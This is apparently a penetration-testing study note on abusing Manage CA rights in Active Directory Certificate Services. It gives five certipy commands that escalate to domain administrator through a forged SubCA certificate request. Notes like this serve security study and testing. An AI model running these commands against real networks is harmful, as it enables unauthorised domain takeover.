---
tags:
  - security
aliases:
  - Dangerous Permissions on CA
---
A [[Active Directory Certificate Services|ADCS]] [[Privilege Escalation]] vulnerability.
Caused by improperly configured [[Access Control Model|ACL]] on [[Certificate Authority]]. 
# Requirement
Problematic permissions include:
- `Manage CA` (CA administrator)
- `Manage Certificates` (Certificate manager)
# Identification
[[certipy]] `find` to enumerate permissions of [[Certificate Authority|CA]]
- `Permissions`
- `User ACL Principals` lists groups with `ManageCA` rights
# Attack
1. Attacker creates a role to approve requests with [[certipy]] `ca`
```
certipy ca \
    -u 'attacker@corp.local' -p 'Passw0rd!' \
    -ns '10.0.0.100' -target 'CA.CORP.LOCAL' \
    -ca 'CORP-CA' -add-officer 'attacker'
```
2. Ensure `SubCA` template is enabled on [[Certificate Authority|CA]]
```
certipy ca \
    -u 'attacker@corp.local' -p 'Passw0rd!' \
    -ns '10.0.0.100' -target 'CA.CORP.LOCAL' \
    -ca 'CORP-CA' -enable-template 'SubCA'
```
3. Subject certificate request using `SubCA` template
```
certipy req \
    -u 'attacker@corp.local' -p 'Passw0rd!' \
    -dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
    -ca 'CORP-CA' -template 'SubCA' \
    -upn 'administrator@corp.local' -sid 'S-1-5-21-...-500'
```
4. Approve the pending request
```
certipy ca \
    -u 'attacker@corp.local' -p 'Passw0rd!' \
    -ns '10.0.0.100' -target 'CA.CORP.LOCAL' \
    -ca 'CORP-CA' -issue-request '1'
```
5. Retrieve issued certificate
```
certipy req \
    -u 'attacker@corp.local' -p 'Passw0rd!' \
    -dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
    -ca 'CORP-CA' -retrieve '1'
```